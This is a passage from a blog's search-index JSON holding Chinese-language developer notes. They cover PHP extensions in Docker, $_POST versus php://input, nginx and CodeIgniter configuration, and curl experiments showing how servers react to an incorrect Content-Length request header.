開啟擴展的那一行是寫在文件/usr/local/etc/php/conf.d/docker-php-ext-擴展名.ini 這個配置文件裡面的。查看命令 php -i 的輸出 ... 煥然大悟。\n\n看著這篇「恍然大悟」，我也跟者恍然大悟 XD\n\n[docker-php-ext-enable 可以开启扩展的原理 | 一颗西瓜籽](https://huanghantao.github.io/2018/12/21/docker-php-ext-enable%E5%8F%AF%E4%BB%A5%E5%BC%80%E5%90%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8E%9F%E7%90%86/)\n\n最後[windows 下 php 无法使用 mcrypt 的解决 - xieye - ITeye 博客](https://xieye.iteye.com/blog/802509)，因為不知道 window 要怎麼安裝 mcrypt\n剛好有翻到這篇，不過我沒有嘗試。\n\n參考來源:\n\n- [How to install php-redis extension using the official PHP Docker image approach? - Stack Overflow](https://stackoverflow.com/questions/31369867/how-to-install-php-redis-extension-using-the-official-php-docker-image-approach)\n- [How to install mcrypt in php7.2 / php7.3 | Lukáš Mešťan](https://lukasmestan.com/install-mcrypt-extension-in-php7-2/)\n- [docker php7.2 not installing mcrypt · Issue #541 · docker-library/php](https://github.com/docker-library/php/issues/541)\n- [windows 下 php 无法使用 mcrypt 的解决 - xieye - ITeye 博客](https://xieye.iteye.com/blog/802509)\n- [php7.1 加密解密 openssl_encrypt 替代 mcrypt - 简书](https://www.jianshu.com/p/ad88f1b8b2df)\n\n最近看到有人分享 phpenv.cn\n發現裡面有整合 nginx 和 redis\n為什麼會寫在這邊呢 怕忘記寫...\n","tags":["mcrypt"],"categories":["PHP"]},{"title":"$_POST和php://input小記","url":"%2Fblog%2F2019%2F04%2F08%2FPOST%E5%92%8Cphp-input%E5%B0%8F%E8%A8%98%2F","content":"\n最近有一支 API 踩到一個 API\n他 request header 帶`Content-Type: json`\n但我們平常寫程式可能不會注意到的地方\n這邊我小記一下\n\n<!--more-->\n\n## \\$\\_POST\n\n**只有 application/x-www-form-urlencoded or multipart/form-data 是有效的!!**\n**只有 application/x-www-form-urlencoded or multipart/form-data 是有效的!!**\n**只有 application/x-www-form-urlencoded or multipart/form-data 是有效的!!**\n\n所以當`Content-Type:application/json`\n\\$\\_POST 變數不會有任何作用!!!\n\n> An associative array of variables passed to the current script via the HTTP POST method when using application/x-www-form-urlencoded or multipart/form-data as the HTTP Content-Type in the request.\n> $HTTP_POST_VARS contains the same initial information, but is not a superglobal. (Note that $HTTP_POST_VARS and \\$\\_POST are different variables and that PHP handles them as such)\n\n> 當 HTTP POST 請求的 Content-Type 是 application/x-www-form-urlencoded 或 multipart/form-data 時，會將變量以關聯數組形式傳入當前腳本。\n> $HTTP_POST_VARS 包含相同的信息，但它不是一個超全局變量。 (注意 $HTTP_POST_VARS 和 \\$\\_POST 是不同的變量，PHP 處理它們的方式不同)\n\nEX:\n\n## php://input\n\n**Content-Type:multipart/form-data 是無效的!!**\n**Content-Type:multipart/form-data 是無效的!!**\n**Content-Type:multipart/form-data 是無效的!!**\n\n> php://input 是個可以訪問請求的原始數據的只讀流。 POST 請求的情況下，最好使用 php://input 來代替 $HTTP_RAW_POST_DATA，因為它不依賴於特定的 php.ini 指令。 而且，這樣的情況下 $HTTP_RAW_POST_DATA 默認沒有填充， 比激活 always_populate_raw_post_data 潛在需要更少的內存。 enctype=\"multipart/form-data\" 的時候 php://input 是無效的。\n\n仔細想想，可以開發者工具來看，通常用**multipart/form-data**都是用來上傳檔案的，所以會看到一些串流內容\n\n```\n之前看過Xuite API，[Xuite 開發者首頁](http://api.xuite.net/document/xuite_dev/public/front/index/id/267)\n他們上傳檔案API是要打兩次\n第一次取upload資訊，會取得第二次上傳打API網址\n```\n\n事後覺得我想太多，他們 Content-Type 不是傳 JSON\n\n[PHP: 支持的协议和封装协议 - Manual](https://www.php.net/manual/zh/wrappers.php)\n\n[XYZ 的筆記本: PHP 使用 file_get_contents 接收 POST 的資料](https://xyz.cinc.biz/2013/06/php-filegetcontents-post.html) {% asset_link 1.png 備份圖 %}\n[深入剖析 PHP 输入流 php://input -- 简明现代魔法](http://www.nowamagic.net/academy/detail/12220520) {% asset_link 2.png 備份圖 %}\n\n## \\$HTTP_RAW_POST_DATA\n\nPHP7.0 已移除，建議不要使用。\n\n**This feature was DEPRECATED in PHP 5.6.0, and REMOVED as of PHP 7.0.0.**\n\n> $HTTP_RAW_POST_DATA contains the raw POST data. See always_populate_raw_post_data.\n> In general, php://input should be used instead of $HTTP_RAW_POST_DATA.\n","tags":["php"],"categories":["PHP"]},{"title":"nginx設定小記","url":"%2Fblog%2F2019%2F04%2F07%2Fnginx%E8%A8%AD%E5%AE%9A%E5%B0%8F%E8%A8%98%2F","content":"\n最近專案開始有使用 Nginx\n之前沒有什麼機會用到\n所以對設定也不是很清楚\n趁這個機會整理\n\n<!--more-->\n\n這邊有爬到[nginxconfig.io](https://nginxconfig.io/)\n可以簡單設定 nginx 設定\n這篇主要是紀錄目前專案有用到的設定\n\n先分享最近專案用的 Codeigniter 的 nginx 設定檔\n\n```\nserver {\n    listen 80;\n    index index.php index.html;\n    server_name localhost;\n    error_log  /var/log/nginx/error.log;\n    access_log /var/log/nginx/access.log;\n    root /usr/local/nginx/html;\n\n    location / {\n        try_files $uri $uri/ /index.php;\n    }\n\n    location ~  ^.+\\.php {\n        fastcgi_pass   php-fpm:9000;\n        fastcgi_index  index.php;\n        fastcgi_split_path_info ^(.+\\.php)(.*)$;\n        fastcgi_param   PATH_INFO $fastcgi_path_info;\n        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n        fastcgi_param    PATH_TRANSLATED    $document_root$fastcgi_path_info;\n        include        fastcgi_params;\n    }\n\n    # unless the request is for a valid file (image, js, css, etc.), send to bootstrap\n    if (!-e $request_filename)\n    {\n        rewrite ^/(.*)$ /index.php?/$1 last;\n        break;\n    }\n}\n```\n\n最近專案使用[Codeigniter 在 nginx 上設定 rewrite 的方法 @ 秋風落葉、萍水相逢 - Matt 網頁製作 生活旅遊 日誌 :: 痞客邦 ::](http://matt7137.pixnet.net/blog/post/42754388-codeigniter%E5%9C%A8nginx%E4%B8%8A%E8%A8%AD%E5%AE%9Arewrite%E7%9A%84%E6%96%B9%E6%B3%95)\n\n## location\n\n> 語法規則\n> location [ = | ~ | ~* | ^~ ] uri { ... }\n> location @name { ... }\n> 語法規則很簡單，一個 location 關鍵字，後面跟著可選的修飾符，後面是要匹配的字符，花括號中是要執行的操作。\n> 修飾符\n> = 表示精確匹配。只有請求的 url 路徑與後面的字符串完全相等時，才會命中。\n> ~ 表示該規則是使用正則定義的，區分大小寫。\n> ~\\* 表示該規則是使用正則定義的，不區分大小寫。\n> ^~ 表示如果該符號後面的字符是最佳匹配，採用該規則，不再進行後續的查找。\n\n參考來源\n[一文弄懂 Nginx 的 location 匹配 - 個人文章 - SegmentFault 思否](https://segmentfault.com/a/1190000013267839) {% asset_link location_1.png 備份圖 %}\n\n> location 順序/優先級：\n> (location =) > (location 完整路徑) > (location ^~ 路徑) > (location ~,~\\* 正則順序) > (location 部分起始路徑) > (/)\n\n參考來源\n[nginx 中 location 的顺序(优先级)及 rewrite 规则写法 - 永福的博客 - 开源中国](https://my.oschina.net/foreverich/blog/800359)\n\n## root\n\n簡單來說就是放的程式路徑\n\n> root 是指定項目的根目錄，適用與 server 和 location。可以指定多個，如果 locaiton 沒有指定，會往其外層的 server 或 http 中尋找繼承。\n\n更多內容可以看[Nginx 靜態服務配置---詳解 root 和 alias 指令 - 簡書](https://www.jianshu.com/p/4be0d5882ec5) {% asset_link root_1.png 備份圖 %}\n\n## try_files\n\n這個函示有些 rewrite 可以套用在這功能上面\n簡單檔案不存在的時候，可以自己設定指定到某一隻檔案\n但要注意那個檔案需要存在，否則會 ERROR\n\n看到網路上有人拿來做 cache\n\n```\n        location / {\n                # 檢查是否有這個檔案或資料夾存在，不存在則使用index.php內容\n                try_files $uri $uri/ /index.php;\n        }\n```\n\n`rewrite ^/(.*)$ /index.php?/$1 last;`這段寫法是在網址前面加上 index.php\n只要有關 index.php 都會導入到 phpfpm 裡面去\n\n[Nginx 的 try_files 参数保证能懂的讲解-10536390-51CTO 博客](https://blog.51cto.com/10546390/1754757) {% asset_link 2.png 備份圖 %}\n[Nginx 的 try_files 指令使用实例 - 运维之美](https://www.hi-linux.com/posts/53878.html)\n[请给你的 Laravel 一份更好的 Nginx 配置 · yii.im](https://yii.im/posts/the-right-way-to-set-nginx-for-laravel/) {% asset_link 1.png 備份圖 %}\n\n## nginx if\n\n> 計算指定的 condition 的值。如果為真，執行定義在大括號中的 rewrite 模塊指令，並將 if 指令中的配置指定給請求。if 指令會從上一層配置中繼承配置。\n> 條件可以是下列任意一種：\n> 變量名；如果變量值為空或者是以「0」開始的字符串，則條件為假；\n> 使用「=」和「!=」運算符比較變量和字符串；\n> 使用「~」（大小寫敏感）和「~\\*」（大小寫不敏感）運算符匹配變量和正則表達式。正則表達式可以包含匹配組，匹配結果後續可以使用變量$1..$9 引用。如果正則表達式中包含字符「}」或者「;」，整個表達式應該被包含在單引號或雙引號的引用中。\n> 使用「-f」和「!-f」運算符檢查文件是否存在；\n> 使用「-d」和「!-d」運算符檢查目錄是否存在；\n> 使用「-e」和「!-e」運算符檢查文件、目錄或符號鏈接是否存在；\n> 使用「-x」和「!-x」運算符檢查可執行文件；\n\n[nginx location if 的匹配規則-殘劍-51CTO 博客](https://blog.51cto.com/cuidehua/1874770)\n[Nginx 配置陷阱之万恶的 if 指令 – 虚伪的灵魂](https://xwsoul.com/posts/761)\n[XYZ 的筆記本: Nginx if、and、網域名稱、GET 變數判斷](https://xyz.cinc.biz/2016/06/nginx-if-and-host-get-variable.html)\n\n## rewrite\n\n> Context: server, location, if\n> rewrite regex replacement [flag];\n\n[搞懂 nginx 的 rewrite 模块 - youyu 岁月 - SegmentFault 思否](https://segmentfault.com/a/1190000008102599)\n[第七章：nginx 的 rewrite 规则详解 - 简书](https://www.jianshu.com/p/3b2345f7347d)\n[Nginx Rewrite 規則寫法 | Helloyungke](https://yungke.me/nginx-location-rewrite/)\n\n因為我的專案程式有掛 nginx docker 裡面目錄\n所以我猜測下面應該也能執行\n\n```\n   location ~* \\.(js|jpg|png|css)$ {\n        expires 30d;\n    }\n[Laravel nginx conf file](https://gist.github.com/ashleydw/afd389b1e763d3c1cf1f)\n```\n\n[vhosts - Serving html / css / js files with nginx - Stack Overflow](https://stackoverflow.com/questions/41330739/serving-html-css-js-files-with-nginx)\n[nginx rewrite 指令 last break 区别-Tenderrain-51CTO 博客](https://blog.51cto.com/tenderrain/1949254)\n\n## fastcgi\n\nfastcgi_index 相對就是 nginx index 差不多東西\n\n[nginx 配置里的 fastcgi_index 是用来干嘛？和 index 的区别是？ - 开源中国](https://www.oschina.net/question/92960_38798)\n\n> 因此不再建议大家使用以下方式（搜了一下，网上大量的文章，并且 nginx.conf 的默认配置也是使用这种方式）：\n> ~~fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; ~~\n> ~~include fastcgi_params;~~\n> 而推荐使用最新的方式：\n> include fastcgi.conf;\n\nfastcgi_split_path_info\n\n> 舊版本的 nginx 使用如下方式配置\n>\n> ```\n> location ~ .php($|/) {\n>    set $script $uri;\n>\n>    set $path_info \"\";\n>    if ($uri ~ \"^(.+.php)(/.+)\") {\n>    >    set $script $1;\n>    >    set $path_info $2;\n>    }\n>    fastcgi_pass 127.0.0.1:9000;\n>    fastcgi_index index.php;\n>    fastcgi_param SCRIPT_FILENAME $document_root$script;\n>    fastcgi_param SCRIPT_NAME $script;\n>    fastcgi_param PATH_INFO $path_info;\n> }\n> ```\n\n> 新版本的 nginx 也可以使用 fastcgi_split_path_info 指令來設置 PATH_INFO，舊的方式不再推薦使用，在 location 段添加如下配置。\n>\n> ```\n> location ~ ^.+.php {\n> (...)\n> fastcgi_split_path_info ^((?U).+.php)(/?.+)$;\n>   fastcgi_param SCRIPT_FILENAME /path/to/php$fastcgi_script_name;\n> fastcgi_param PATH_INFO $fastcgi_path_info;\n>   fastcgi_param PATH_TRANSLATED $document_root\\$fastcgi_path_info;\n> (...)\n> }\n>\n> ```\n\nfastcgi_param 可設定環境參數\n其他可參考[ngx_http_fastcgi_module 的那些事 - Web 开发手扎 - SegmentFault 思否](https://segmentfault.com/a/1190000002667095) {% asset_link phpfpm_1.png 備份圖 %}\n\n這邊我還是搞不懂 phpfpm 跟 mod_php 到底有什麼差別\n有 google 爬到一篇，秒懂\n\n> FastCGI 是什麼?\n> 接下來又提到那 FastCGI 是什麼呢? FastCGI 是用來提高 CGI 處理 process 性能用的\n> 那 FastCGI 會怎麼實作呢?\n> 當 php 啟動時、會去尋找 php.ini、進行環境的初始化，如果不使用 FastCGI 的情況下，每一個請求都會做這個動作，很明顯浪費系統資源，所以 FastCGI 會先啟動一個 master，解析配置文件用，接下來再啟動 worker，當請求過來時、master 會遞資訊給 worker，然後接下來等下一個請求，有這個機制就不用每一次重新跑一次初始化的動作了\n\n[秒懂 PHP 的 FastCGI 跟 PHP-FPM 有什麼關係 - Astral web 歐斯瑞公司](https://www.astralweb.com.tw/what-is-differences-between-fastcgi-php-fpm/)\n\n[[转] fastcgi.conf 与 fastcgi_params - - ITeye 博客](https://gxl-ct001.iteye.com/blog/2270522)\n\n[\\$\\_SERVER['SCRIPT_FILENAME'] 与 **FILE** 区别 - 常斯特啰嗦司机 - 博客园](https://www.cnblogs.com/clphp/p/5106284.html)\n[Nginx(PHP/fastcgi)的 PATH_INFO 配置 | 尘埃](http://wangying.sinaapp.com/archives/796)\n[nginx 新手配置\\$document_root - 海盗船的个人空间 - 开源中国](https://my.oschina.net/zhichi2011/blog/118409)\n[nginx 使用 arg\\_重写带参数 url 案例-明天过后-51CTO 博客](https://blog.51cto.com/leeyan/1865448)\n"},{"title":"遇到Content-Length不正確到底發生什麼情況","url":"%2Fblog%2F2019%2F04%2F05%2F%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81%2F","content":"\n最近公司有一個案子，對方用程式打 API 竟然會會帶`content-length:2`，但並未帶 body 值\n導致程式會不正確，但對方說程式已經用現有的 function，所以沒辦法修正\n最後這個問題還是沒法解決\n這幾天研究`content-length:2`會影響什麼情形\n在`公司`和`家`裡測試結果會不太一樣~~讓我矇 B~~\n所以測試的時候不知道發生什麼事情\n這邊只記錄我測出來結果\n\n<!--more-->\n\n注意這邊的 Content-Length 都先只 request header 裡面\n不是只 response Content-Length\n\n## 介紹 request Content-Length\n\n簡單一句話，就是 POST DATA 資料傳給 Server 長度。\n\n有找到更短詳細介紹\n\n> - 響應為 1xx，204，304 相應或者 head 請求，則直接忽視掉消息實體內容。\n> - 如果有 Transfer-Encoding，則優先採用 Transfer-Encoding 裡面的方法來找到對應的長度。比如說 Chunked 模式。\n> - 「如果 head 中有 Content-Length，那麼這個 Content-Length 既表示實體長度，又表示傳輸長度。如果實體長度和傳輸長度不相等(比如說設置了 Transfer-Encoding)，那麼則不能設置 Content-Length。如果設置了 Transfer-Encoding，那麼 Content-Length 將被忽視」。這句話翻譯的優點饒，其實關鍵就一點：有了 Transfer-Encoding，則不能有 Content-Length。\n> - 通過服務器關閉連接能確定消息的傳輸長度。(請求端不能通過關閉連接來指明請求消息體的結束，因為這樣可以讓服務器沒有機會繼續給予響應)。這種情況主要對應為短連接，即非 keep-alive 模式。\n>   HTTP1.1 必須支持 chunk 模式。因為當不確定消息長度的時候，可以通過 chunk 機制來處理這種情況。\n> - 在包含消息內容的 header 中，如果有 content-length 字段，那麼該字段對應的值必須完全和消息主題裡面的長度匹配。\n>   其實後面幾條幾乎可以忽視，簡單總結後如下：\n>   1、Content-Length 如果存在並且有效的話，則必須和消息內容的傳輸長度完全一致。(經過測試，如果過短則會截斷，過長則會導致超時。)\n>   2、如果存在 Transfer-Encoding(重點是 chunked)，則在 header 中不能有 Content-Length，有也會被忽視。\n>   3、如果採用短連接，則直接可以通過服務器關閉連接來確定消息的傳輸長度。(這個很容易懂)\n>   結合 HTTP 協議其他的特點，比如說 Http1.1 之前的不支持 keep alive。那麼可以得出以下結論：\n>   1、在 Http 1.0 及之前版本中，content-length 字段可有可無。\n>   2、在 http1.1 及之後版本。如果是 keep alive，則 content-length 和 chunk 必然是二選一。若是非 keep alive，則和 http1.0 一樣。content-length 可有可無。\n\n## 靜態資源\n\n先講一下，這邊靜態資源是指`*.jpg,*.png,*js,*.json`\n以下測試會以 nginx 為主\n\n### HTTP Content-Length 數值不正確 可正常執行\n\n連`http`時候，`靜態`資源不管`Content-Length`帶多少(正確或不正確)，apache,nginx 都可以正常回傳程式\n我在我的電腦裝 nginx 測試\n雖然有些網站可能不正常，目前推測可能有防火牆關係\n防火牆可能會分析這封包不正確，可能會阻擋\n\n不能正確連線 EX:\n\n```\ncurl -v --request \"GET\" --header \"content-length:2\" http://www.cyut.edu.tw/~ywfan/index.htm\nNote: Unnecessary use of -X or --request, GET is already inferred.\n*   Trying 163.17.1.15...\n* TCP_NODELAY set\n* Connected to www.cyut.edu.tw (163.17.1.15) port 80 (#0)\n> GET /~ywfan/index.htm HTTP/1.1\n> Host: www.cyut.edu.tw\n> User-Agent: curl/7.58.0\n> Accept: */*\n> content-length:2\n>\n```\n\n可以正常連線，這邊隨便有找到一個可正常連線\n我上面先前我有打可能會跟防火牆(這邊防火牆不是指 OS 防火牆)\n因為我家可以正常打、公司那邊會不正常\n所以可能被硬體防火牆(Web Application Firewall)阻擋\n\n家裡執行指令\n\n```\n curl -v --request \"GET\" --header \"content-length:200\" http://jimmypm.ehosting.com.tw/a.htm\nNote: Unnecessary use of -X or --request, GET is already inferred.\n*   Trying 203.69.42.72...\n* TCP_NODELAY set\n* Connected to jimmypm.ehosting.com.tw (203.69.42.72) port 80 (#0)\n> GET /a.htm HTTP/1.1\n> Host: jimmypm.ehosting.com.tw\n> User-Agent: curl/7.58.0\n> Accept: */*\n> content-length:200\n>\n< HTTP/1.1 200 OK\n< Content-Type: text/html\n< Last-Modified: Thu, 04 Apr 2019 04:12:18 GMT\n< Accept-Ranges: bytes\n< ETag: \"923231989cead41:0\"\n< Server: Microsoft-IIS/7.5\n< X-Powered-By: ASP.NET\n< Date: Fri, 05 Apr 2019 16:23:21 GMT\n< Content-Length: 48739\n<\n```\n\n公司執行指令結果\n\n```\n$  curl -v --request \"GET\" --header \"content-length:200\" http://jimmypm.ehosting.com.tw/a.htm\nNote: Unnecessary use of -X or --request, GET is already inferred.\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0*  Trying 203.69.42.72...\n* TCP_NODELAY set\n* Connected to jimmypm.ehosting.com.tw (203.69.42.72) port 80 (#0)\n> GET /a.htm HTTP/1.1\n> Host: jimmypm.ehosting.com.tw\n> User-Agent: curl/7.61.1\n> Accept: */*\n> content-length:200\n>\n  0     0    0     0    0     0      0      0 --:--:--  0:02:18 --:--:--     0*Empty reply from server\n\n* Connection #0 to host jimmypm.ehosting.com.tw left intact\ncurl: (52) Empty reply from server\n```\n\n## 動態資源\n\n例如`*.asp`,`*.jsp`,`*.php`\n只要做到`Content-Length:2` 沒有送出`data`(POST DATA)\n就會出錯，接收到`408` 連線逾時。\n\n這邊簡單詳細講一下，Server 是主動關閉的，這時候 client 會持續等待，使用者關閉頁面，也不會影響結果\n使用者沒有關閉的話，Server 沒接收 data 資料，就會回傳`408`\n這時候使用者會接收到`408`\n\n維基百科\n\n> 408 Request Timeout\n> 請求超時。根據 HTTP 規範，用戶端沒有在伺服器預備等待的時間內完成一個請求的傳送，用戶端可以隨時再次提交這一請求而無需進行任何更改\n\n## HTTPS\n\n不管靜態資源、動態資源都會錯誤\n\n- 動態資源\n\n```bash\ncurl -v --request \"GET\" --header \"Content-Length:3\" --data \"12345\"  https://tw.yahoo.com                                                                                       ✔  20  15:16:43\n* Rebuilt URL to: https://tw.yahoo.com/\n*   Trying 124.108.103.104...\n* TCP_NODELAY set\n* Connected to tw.yahoo.com (124.108.103.104) port 443 (#0)\n* ALPN, offering h2\n* ALPN, offering http/1.1\n* successfully set certificate verify locations:\n*   CAfile: /etc/ssl/certs/ca-certificates.crt\n  CApath: /etc/ssl/certs\n* TLSv1.2 (OUT), TLS handshake, Client hello (1):\n* TLSv1.2 (IN), TLS handshake, Server hello (2):\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\n* TLSv1.2 (OUT), TLS change cipher, Client hello (1):\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\n* TLSv1.2 (IN), TLS handshake, Finished (20):\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256\n* ALPN, server accepted to use h2\n* Server certificate:\n*  subject: C=US; ST=California; L=Sunnyvale; O=Oath Inc; CN=*.www.yahoo.com\n*  start date: Feb  1 00:00:00 2019 GMT\n*  expire date: Jul 31 12:00:00 2019 GMT\n*  subjectAltName: host \"tw.yahoo.com\" matched cert's \"tw.yahoo.com\"\n*  issuer: C=US; O=DigiCert Inc; OU=www.digicert.com; CN=DigiCert SHA2 High Assurance Server CA\n*  SSL certificate verify ok.\n* Using HTTP2, server supports multi-use\n* Connection state changed (HTTP/2 confirmed)\n* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0\n* Using Stream ID: 1 (easy handle 0x55d96331c780)\n> GET / HTTP/2\n> Host: tw.yahoo.com\n> User-Agent: curl/7.58.0\n> Accept: */*\n> Content-Length:3\n> Content-Type: application/x-www-form-urlencoded\n>\n* We are completely uploaded and fine\n* Connection state changed (MAX_CONCURRENT_STREAMS updated)!\n* Connection #0 to host tw.yahoo.com left intact\ncurl: (16) Error in the HTTP2 framing layer\n```\n\n- 靜態資源\n\n```bash\n curl  --request \"GET\" --header \"Content-Length:3\"  https://code.jquery.com/jquery-1.11.3.js\ncurl: (52) Empty reply from server\n```\n\n## Content-Length 接收的值>Header 值\n\n我有簡單寫個 PHP 程式\n\n```php\n<?php\n$data = file_get_contents('php://input');\nvar_dump($data);\n```\n\n簡單可以看出 post raw data\n這邊用 nginx+phpfpm 測出來結果\n其實會被截斷\n\n```bash\ncurl -v --request \"GET\" --header \"Content-Length:3\" --data \"12345\"  http://192.168.1.121:32771/testpost.php\n*   Trying 192.168.1.121...\n* TCP_NODELAY set\n* Connected to 192.168.1.121 (192.168.1.121) port 32771 (#0)\n> GET /testpost.php HTTP/1.1\n> Host: 192.168.1.121:32771\n> User-Agent: curl/7.58.0\n> Accept: */*\n> Content-Length:3\n> Content-Type: application/x-www-form-urlencoded\n>\n* upload completely sent off: 5 out of 5 bytes\n< HTTP/1.1 200 OK\n< Date: Sat, 06 Apr 2019 07:14:21 GMT\n< Server: Apache/2.4.25 (Debian)\n< Content-Length: 16\n< Content-Type: text/html; charset=UTF-8\n<\nstring(3) \"123\"\n* Connection #0 to host 192.168.1.121 left intact\n```\n\n## Apache Cotent-Length 不會 408\n\n今天發現有一個 PHP 網站，`content-length:x`都可以正常運作\n不過發現是用`apache+mod_php`\n我自己有測試還真的能 work\n\n```bash\ncurl --request \"GET\" --header \"Content-Length:3\" http://mcu.no-ip.org/\n```\n\n可用這個 docker hub 做簡單測試\n[eboraas/apache-php Dockerfile - Docker Hub](https://hub.docker.com/r/eboraas/apache-php/dockerfile)\n\nPS:apache+php-fpm 不會回傳 response，但說奇怪 apache log 會顯示 200\n\n以下是 apache+php-fpm\n\n```bash\ncurl -v --request \"GET\" --header \"Content-Length:3\"  http://192.168.1.121:32772/testpost.php\n\nNote: Unnecessary use of -X or --request, GET is already inferred.\n*   Trying 192.168.1.121...\n* TCP_NODELAY set\n* Connected to 192.168.1.121 (192.168.1.121) port 32772 (#0)\n> GET /phpinfo.php HTTP/1.1\n> Host: 192.168.1.121:32772\n> User-Agent: curl/7.58.0\n> Accept: */*\n> Content-Length:3\n>\n< HTTP/1.1 200 OK\n< Date: Sat, 06 Apr 2019 07:08:31 GMT\n< Server: Apache/2.4.7 (Ubuntu)\n< Connection: close\n<\n* Closing connection 0\n```\n\n什麼 Apache 跟 nginx 結果不太一樣!!!\n我也冏了!!!不過依然沒有找到相關文獻\n\n在 Apache 官網文件[mod_policy - Apache HTTP Server Version 2.5](https://httpd.apache.org/docs/trunk/en/mod/mod_policy.html)\n\n```\nPolicyLength Directive\nDescription:\tEnable the content length policy.\nSyntax:\tPolicyLength ignore|log|enforce\nDefault:\tignore\nContext:\tserver config, virtual host, directory\nStatus:\tExtension\nModule:\tmod_policy\nCompatibility:\tPolicyLength is only available in Apache 2.5.0 and later.\n```\n\n不確定是不是這個關係，目前他說這個選項 Apache2.5 才會有(現在才 Apache2.4)\n我找不到 2.5 版本= =\n有可能現在是讓他過\n\n## Web Application Firewall 影響\n\n有爬到這個，目前猜測公司或有些網站連不到可能之中有類似 WAF\n這東西影響到\n[Web Application Firewall 的偵測原理 – 軟體品管的專業思維](https://www.qa-knowhow.com/?p=4679)\n\n> 6. HTTP 標準協議\n>    檢查請求的內容是否符合 HTTP 標準協議, 這是一種比較有效且直覺的方式\n>    任意修改 HTTP 協議內容可能會導致的攻擊如下:\n>    http://capec.mitre.org/data/definitions/220.html\n>    HTTP 協議中檢查的重點為:\n>    MIME 中 filename 檔名\n>    URL 合法性\n>    Content-Length 數值\n>    衝突與重複的 HTTP headers, 例如 keep-alive 與 close 重複與衝突\n>    不安全的字元, 例如 ” “, “<“, “>”, “{“, “}”, “|”, “\\”, “^”, “~”, “[“, “]”, and “`”.等\n>    過濾異常缺少 Http header 的請求, 一般正常的請求會包含 Host, User-Agent, Accept headers, 因此如果缺少或是沒有值都是表示異常\n>    Content-Length 不等於 0 但是卻沒有 Content-Type\n>    HTTP protocol version\n\n## nginx 從 phpfpm 那邊調整 改 header 失敗筆記\n\n在這裡面[Nginx 之 fastcgi_param 参数详见 - 简书](https://www.jianshu.com/p/282db1543a78)\n`fastcgi_param CONTENT_LENGTH $content_length; #请求头中的Content-length字段。`\n發現這個不會正常執行\n目前猜測 nginx 在接收 request 封包時候，第一時間不會做更改\n但當時`Content-Length:2`會持續等待\n所以可能在等接收資料，逾時會傳 408\n所以根本~~不會做到修改 header 那一段~~正確來說 php-fpm 那段沒有執行到\n收不到改 header 那段\n\n## nginx POST 打靜態資源會 405\n\n[Nginx 將靜態文件響應 POST 請求，提示 405 錯誤問題](https://gist.github.com/zxhfighter/7560812)\n\n> Nginx 的 405 錯誤\n> 絕大多數服務器，都不允許靜態文件響應 POST 請求(GET 請求靜態文件是天經地義的)，否則會返回 HTTP/1.1 405 Method not allowed 錯誤。\n> 然而在前端開發中，前端開發工程師經常模擬後端請求，返回靜態數據來查看頁面效果，怎麼辦？\n\n## 其他小記\n\ncurl 預設是 Content-Type: application/x-www-form-urlencoded ，假如要傳 raw data 要改成 Content-Type: text/plain\n\n> curl's --data will by default send Content-Type: application/x-www-form-urlencoded in the request header. However, when using Postman's raw body mode, Postman sends Content-Type: text/plain in the request header.\n> So to achieve the same thing as Postman, specify -H \"Content-Type: text/plain\" for curl:\n\n重啟 docker nginx\n[Docker: Reload Nginx Inside Container - ShellHacks](https://www.shellhacks.com/docker-reload-nginx-inside-container/)\n\n```bash\ndocker container exec <container> nginx -t\ndocker container exec <container> nginx -s reload\n```\n\nKeep-Alive 为 close\n也無法改變 nginx 的 content-length 問題\nkeepalive_timeout 0; ，就可以關掉\n\nFull request/response body logging in nginx 沒有測試，好像要裝 lua-nginx-module\n[Full request/response body logging in nginx](https://gist.github.com/morhekil/1ff0e902ed4de2adcb7a)\n\n## 感想與結論\n\n沒事**還是請傳好正確 content-length:0**\n原本想讓 server 變成 http1.0\n但好像怎麼用都失敗\n\n對方說沒辦法改的話\n最終大絕可能使用`apache+php_mod`不過最糟的情形還是會被 WAF 阻擋\n\n這幾天總覺得浪費很多時間找這玩意\n明明是對方的鍋，還是要想辦法解決\n但是真的不希望遇到第二次 冏\n\n**2020-05-27**\n\n[用了这么久HTTP, 你是否了解Content-Length? | Fundebug博客 - 一行代码搞定BUG监控 - 网站错误监控|JS错误监控|资源加载错误|网络请求错误|小程序错误监控|Java异常监控|监控报警|Source Map|用户行为|可视化重现](https://blog.fundebug.com/2019/09/10/understand-http-content-length/)\n這篇有簡單明確講到我這篇重點\n\n其他參考來源:\n\n- [Http Header 入門 | CCNP 筆記本](https://nkongkimo.wordpress.com/2010/04/28/http-header%E5%85%A5%E9%96%80/)\n- [HTTP Request/Response 駭客跟我們想的不一樣 – 軟體品管的專業思維](https://www.qa-knowhow.com/?p=792)\n- [security apache 與 php 關閉版本顯示 | SSORC.tw](https://ssorc.tw/1148)\n- [資訊手札: Apache Http Header](http://chuehnoneinfonote.blogspot.com/2013/02/apache-http-header.html)\n- [web-server | 平凡備忘錄](http://blog.gitdns.org/2016/06/23/web-server/)\n- [HTTP 協議頭部與 Keep-Alive 模式詳解 - BYVoid](https://www.byvoid.com/zht/blog/http-keep-alive-header)\n- [nginx 优化的一些建议 - 吕滔博客](https://lvtao.net/server/1458.html)\n- [客户端 POST 错误，服务端应该回 200 还是 400？ - 知乎](https://www.zhihu.com/question/36007098)\n\n- [Http 協議中關於 Content-Length 的解讀 - 簡書](https://www.jianshu.com/p/fa2e4e23aaaf)\n- [Docker: Reload Nginx Inside Container - ShellHacks](https://www.shellhacks.com/docker-reload-nginx-inside-container/)\n- [Nginx 设置 Keep-Alive 为 close - meteoric_cry - 